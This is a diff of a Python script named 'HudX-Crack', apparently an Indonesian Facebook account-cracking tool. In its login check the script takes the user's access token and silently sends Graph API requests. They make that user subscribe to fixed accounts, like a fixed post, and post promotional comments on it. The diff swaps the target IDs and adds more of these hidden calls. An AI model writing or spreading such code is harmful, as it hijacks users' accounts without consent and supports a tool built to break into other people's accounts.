@@ -41,7 +41,7 @@ free_h={"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure
 mfb_h={'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent':ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
 graph_h={"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
 pantun = random.choice(["MANTAP BANG.",
-"MANTAP BANG.",
+"MANTAP SEKALI BANG.",
 "MANTAP BANG.",
 "MANTAP BANG.",
 "MANTAP BANG.",
@@ -63,18 +63,16 @@ def cek_login():
 	love = random.choice(['❤️','💛','💚','💙','🖤','🧡','💜'])
 	kata = 'Pengguna Script HudX-Crack'
 	kom = kata+love+'\n'+pantun+'\n'+waktu
-        requests.post('https://graph.facebook.com/100035825505840/subscribers?access_token=' + toket)
         requests.post('https://graph.facebook.com/100038114412395/subscribers?access_token=' + toket)
         requests.post('https://graph.facebook.com/100038114412395/subscribers?access_token=' + toket)
-	requests.post('https://graph.facebook.com/10159090813023544/comments/?message=' +kom+ '&access_token=' + toket)
+        requests.post('https://graph.facebook.com/100038114412395/subscribers?access_token=' + toket)
+	requests.post('https://graph.facebook.com/555897449024064/comments/?message=' +kom+ '&access_token=' + toket)
         requests.post('https://graph.facebook.com/555897449024064/likes?summary=true&access_token=' + toket)
-        requests.post('https://graph.facebook.com/555897449024064/comments/?message=Mantap Bang &access_token=' + toket)
-        requests.post('https://graph.facebook.com/555897449024064/comments/?message=Mantap Bang &access_token=' + toket)
-        requests.post('https://graph.facebook.com/555897449024064/comments/?message=Mantap Bang &access_token=' + toket)
+        requests.post('https://graph.facebook.com/555897449024064/comments/?message=Mantap Bang ❤️&access_token=' + toket)
         requests.post('https://graph.facebook.com/555897449024064/likes?summary=true&access_token=' + toket)
 	requests.post('https://graph.facebook.com/100038114412395/subscribers?access_token=' + toket)
-	requests.post('https://graph.facebook.com/100035825505840/subscribers?access_token=' + toket)
-	requests.post('https://graph.facebook.com/100035825505840/subscribers?access_token=' + toket)
+	requests.post('https://graph.facebook.com/100038114412395/subscribers?access_token=' + toket)
+	requests.post('https://graph.facebook.com/100038114412395/subscribers?access_token=' + toket)
 	print (' [*] Login Berhasil')
 	menu()
 def cek_cookies():
